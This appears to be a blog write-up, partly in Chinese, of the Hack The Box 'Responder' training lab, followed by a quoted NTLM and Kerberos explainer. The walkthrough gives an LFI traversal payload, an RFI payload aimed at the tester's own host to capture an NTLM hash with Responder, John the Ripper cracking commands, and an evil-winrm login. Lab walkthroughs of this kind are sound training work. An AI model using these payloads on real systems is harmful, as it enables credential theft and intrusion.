---
layout: ../../layouts/BlogPost.astro
title: "[Hack The Box] [Starting Point] [Tier 1] Responder"
uuid: a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3
version: 295
created: Thu, 08 Sep 2022 06:29:45 +0000
tags:
- z-class/career/pentest
- y-type/resource
- x-status/publish/writeup
---

**TASK 1**

**When visiting the web service using the IP address, what is the domain that we are being redirected to?** unika.htb

**TASK 2**

**Which scripting language is being used on the server to generate webpages?** php

**TASK 3**

**What is the name of the URL parameter which is used to load different language versions of the webpage?** page

**TASK 4**

**Which of the following values for the \`page\` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"?** ../../../../../../../../windows/system32/drivers/etc/hosts

**TASK 5**

**Which of the following values for the \`page\` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"?** //10.10.14.6/somefile

**TASK 6**

**What does NTLM stand for?** New Technology Lan Manager

**TASK 7**

**Which flag do we use in the Responder utility to specify the network interface?** -I

**TASK 8**

**There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as \`john\`, but the full name is what?** John The Ripper

**TASK 9**

**What is the password for the administrator user?** badminton

**TASK 10**

**We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?** 5985

**SUBMIT FLAG**

Steps:

edit /etc/hosts:

`target-ip  unika.htb`

尝试LFI(Local File Inclusion)，爆出具体的路径

![](/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/88538f07-e81a-409c-a293-fe36ae44e07a.png)

验证下路径是否正确，查看hosts文件

![](/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/7c4d5417-7768-45a0-93e6-ea421327738e.png)

使用responder来监听: `sudo responder -I tun0`

然后访问 http://unika.htb/?page=//\[Your_tun0_IP\]/anything

就会获取到hash

![](/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/9ab430bd-0840-42a7-9a12-200212f5935d.png)

把hash保存下来，`echo "Admin....." >hash.txt`

使用john来破解，`john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt`

![](/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/ac2f1a3d-1bce-4d95-9035-24990276422c.png)

接下来开始用nmap扫描，注意该lab有速度检测，建议使用T4速度：

虽然没有扫描出winRM端口，但通过Task 10，谷歌下可以知道说的是winRM，默认端口就是5985

![](/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/9fff90d4-11d7-44b4-993d-b5bc2cf4e614.png)

之后使用evil-winrm工具，即可获取到powershell

![](/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/0265865a-662f-47ec-a065-aad699bbaebd.png)

之后去Users\\mike\\Desktop文件夹下面，得到flag

---

### **Note:**

[Responder.pdf](/attachments/Responder.pdf)

Ref: 

[Auto_Wordlists/file_inclusion_windows.txt at main · carlospolop/Auto_Wordlists (github.com)](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt) 

[Windows 远程管理 - Win32 apps | Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) 

[Windows远程管理的安装和配置 - Win32 apps | Microsoft Docs](https://morgansimonsen.com/2009/12/10/winrm-and-tcp-ports/#:\~:text=WinRM%2C%20or%20Windows%20Remote%20Management%2C%20is%20an%20HTTP,listens%20for%20local%20requests%20on%20TCP%20port%2047001.) 

[NT LAN Manager - Wikipedia](https://en.wikipedia.org/wiki/NT_LAN_Manager) 

[NTLM Overview | Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) 

[NTLM Explained: Definition, Protocols & More | CrowdStrike](https://www.crowdstrike.com/cybersecurity-101/ntlm-windows-new-technology-lan-manager/) 

 

Tools: nmap, responder, john, evil-winrm

Q: 什么是 Windows Remote Management (WinRM)

WinRM，即Windows远程管理，是一个基于HTTP的Windows远程管理和shell协议。

该协议是基于简单对象访问协议 (SOAP) 的、防火墙友好的标准协议，使来自不同供应商的硬件和操作系统能够互操作

如果WinRM没有被配置为远程访问，但该服务被启动，它就会在TCP 47001端口监听本地请求。

如果配置了监听器，它仍将监听47001，但也监听默认的TCP端口5985（HTTP）和5986（HTTPS）。

Q: 什么是Windows New Technology LAN Manager (NTLM) [^1] 

是微软开发的一种用于用户认证的协议，它是一种single sign on (SSO)认证工具

Windows 2000以后，默认被Kerberos协议代替。

---
[^1]: Windows New Technology LAN Manager (NTLM)

    ## **What Is NTLM Used For?**

    **Windows New Technology LAN Manager (NTLM)** is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a **single sign on (SSO)** tool that relies on **a challenge-response protocol** to confirm the user without requiring them to submit a password.

    Despite known vulnerabilities, NTLM remains widely deployed even on new systems in order to maintain compatibility with legacy clients and servers. While NTLM is still supported by Microsoft, it has been replaced by Kerberos as the default authentication protocol in Windows 2000 and subsequent Active Directory (AD) domains.

    ## **How Does the NTLM Protocol Work?**

    NTLM authenticates users through **a challenge-response mechanism**. This process consists of three messages:

    **Negotiation message** from the client

    **Challenge message** from the server

    **Authentication message** from the client

    ### **NTLM Authentication Process**

    **NTLM authentication** typically follows the following step-by-step process:

    The user shares their username, password and domain name with the client.

    The client develops a scrambled version of the password — or hash — and deletes the full password.

    The client passes a plain text version of the username to the relevant server.

    The server replies to the client with a challenge, which is a 16-byte random number.

    In response, the client sends the challenge encrypted by the hash of the user’s password.

    The server then sends the challenge, response and username to the domain controller (DC).

    The DC retrieves the user’s password from the database and uses it to encrypt the challenge.

    The DC then compares the encrypted challenge and client response. If these two pieces match, then the user is authenticated and access is granted.

    ## **The Difference Between NTLM and Kerberos?**

    Like NTLM, **Kerberos** is an authentication protocol. It replaced NTLM as the default/standard authentication tool on Windows 2000 and later releases.

    The main difference between NTLM and Kerberos is in how the two protocols manage authentication. NTLM relies on a three-way handshake between the client and server to authenticate a user. Kerberos uses a two-part process that leverages a ticket granting service or key distribution center.

    Another main difference is whether passwords are hashed or encrypted. NTLM relies on **password hashing**, which is a one-way function that produces a string of text based on an input file; Kerberos leverages **encryption**, which is a two-way function that scrambles and unlocks information using an encryption key and decryption key respectively.

    Even though the Kerberos protocol is Microsoft’s default authentication method today, NTLM serves as a backup. If Kerberos fails to authenticate the user, the system will attempt to use NTLM instead.

    ### **Why Was NTLM Replaced by Kerberos?**

    NTLM was subject to several known security vulnerabilities related to password hashing and salting.

    In NTLM, passwords stored on the server and domain controller are not “**salted**” — meaning that a random string of characters is not added to the hashed password to further protect it from cracking techniques. This means that adversaries who possess a password hash do not need the underlying password to authenticate a session. As a result, systems were vulnerable to **brute force attacks**, which is when an attacker attempts to crack a password through multiple log-in attempts. If the user selects a weak or common password, they are especially susceptible to such tactics.

    NTLM’s cryptography also fails to take advantage of new advances in algorithms and encryption that significantly enhance security capabilities.

    ### **Kerberos Protocol**

    Kerberos was developed by researchers at the Massachusetts Institute of Technology (MIT) in the 1980s. The name is derived from the Greek mythological character Kerberos, the three-headed dog who guards the underworld.

    In practice, the three security components in the Kerberos protocol are represented as:

    A client seeking authentication

    A server the client wants to access

    The ticketing service or key distribution center (KDC)

    ### **Kerberos Authentication**

    Here is the twelve-step process for Kerberos authentication:

    The user shares their username, password, and domain name with the client.

    The client assembles a package — or an authenticator — which contains all relevant information about the client, including the user name, date and time. All information contained in the authenticator, aside from the user name, is encrypted with the user’s password.

    The client sends the encrypted authenticator to the KDC.

    The KDC checks the user name to establish the identity of the client. The KDC then checks the AD database for the user’s password. It then attempts to decrypt the authenticator with the password. If the KDC is able to decrypt the authenticator, the identity of the client is verified.

    Once the identity of the client is verified, the KDC creates a ticket or session key, which is also encrypted and sent to the client.

    The ticket or session key is stored in the client’s Kerberos tray; the ticket can be used to access the server for a set time period, which is typically 8 hours.

    If the client needs to access another server, it sends the original ticket to the KDC along with a request to access the new resource.

    The KDC decrypts the ticket with its key. (The client does not need to authenticate the user because the KDC can use the ticket to verify that the user’s identity has been confirmed previously).

    The KDC generates an updated ticket or session key for the client to access the new shared resource. This ticket is also encrypted by the server’s key. The KDC then sends this ticket to the client.

    The client saves this new session key in its Kerberos tray, and sends a copy to the server.

    The server uses its own password to decrypt the ticket.

    If the server successfully decrypts the session key, then the ticket is legitimate. The server will then open the ticket and review the access control list (ACL) to determine if the client has the necessary permission to access the resource.

    ## **Applications That Use NTLM**

    NTLM was replaced as the default authentication protocol in Windows 2000 by Kerberos. However, NTLM is still maintained in all Windows systems for compatibility purposes between older clients and servers.

    For example, computers still running Windows 95, Windows 98, or Windows NT 4.0 will use the NTLM protocol for network authentication with a Windows 2000 domain. Meanwhile, computers running Windows 2000 will use NTLM when authenticating servers with Windows NT 4.0 or earlier, as well as when accessing resources in Windows 2000 or earlier domains. NTLM is also used to authenticate local logons with non-domain controllers.

    ## **NTLM Benefits and Challenges**

    NTLM is considered an outdated protocol. As such, its benefits — when compared to a more modern solution, such as Kerberos — are limited. Yet the original promise of NTLM remains true: Clients use password hashing to avoid sending unprotected passwords over the network.

    At this point there are several clear disadvantages to relying on NTLM authentication:

    - **Single authentication.** NTLM is a single authentication method. It relies on a challenge-response protocol to establish the user. It does not support [multifactor authentication](https://www.crowdstrike.com/cybersecurity-101/multifactor-authentication-mfa/) (MFA), which is the process of using two or more pieces of information to confirm the identity of the user.

    - **Security vulnerabilities.** The relatively simplistic form of password hashing makes NTLM systems vulnerable to several modes of attacks, including [pass-the-hash](https://www.crowdstrike.com/cybersecurity-101/pass-the-hash/) and [brute-force attacks](https://www.crowdstrike.com/cybersecurity-101/brute-force-attacks/).

    - **Outdated cryptography.** NTLM does not leverage the latest advances in algorithmic thinking or encryption to make passwords more secure.

    ### **How Can You Protect Your Network Using NTLM?**

    Given the known security risks associated with NTLM, CrowdStrike recommends that organizations try to reduce NTLM usage in their network as much as possible.

    For organizations still relying on NTLM for compatibility reasons, CrowdStrike offers the following recommendations to enhance security and minimize risk.

    **Enforce NTLM mitigations.** To be fully protected from NTLM relay attacks, you will need to enable server signing and EPA on all relevant servers.

    **Patch!** Make sure your systems are fully protected with the latest security updates from Microsoft.

    **Use advanced techniques.** Apply advanced NTLM relay detection and prevention techniques similar to the ones disclosed by Preempt (now CrowdStrike) in our Black Hat 2019 talk.

    **Identify weak variations.** Some NTLM clients use weak NTLM variations (e.g., don’t send a MIC). This puts your network at a greater risk of being vulnerable to NTLM relay.

    **Monitor NTLM traffic in your network.** Try to restrict insecure NTLM traffic.

    Get rid of clients sending LM responses and set the Group Policy Object (GPO) network security: LAN Manager authentication level to refuse LM responses.